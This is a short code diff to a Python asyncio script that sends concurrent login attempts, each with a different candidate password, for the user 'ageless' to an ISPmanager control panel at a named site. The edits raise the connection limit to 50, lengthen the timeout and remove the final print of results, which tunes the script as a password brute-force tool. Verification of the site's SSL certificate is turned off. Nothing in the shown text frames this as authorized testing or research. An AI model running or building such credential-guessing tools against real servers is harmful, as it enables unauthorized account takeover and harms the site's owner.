@@ -29,7 +29,7 @@ headers = {
 url='https://ageless.su/manager/ispmgr'
 
 async def lol():
-	conn = TCPConnector(verify_ssl=False)
+	conn = TCPConnector(verify_ssl=False, limit=50)
 	async with ClientSession(connector=conn,loop=asyncio.get_event_loop()) as session:
 		tasks = []
 		i = 0
@@ -42,7 +42,7 @@ async def lol():
 
 async def fetch(session, password):
 	try:
-		with async_timeout.timeout(10):
+		with async_timeout.timeout(5000):
 			print("Scedule {}".format(password))
 			async with session.post(url, data={
 				"username": "ageless",
@@ -63,6 +63,5 @@ async def fetch(session, password):
 
 
 loop = asyncio.get_event_loop()
-results = loop.run_until_complete(lol())
+loop.run_until_complete(lol())
 loop.close()
-print(results)
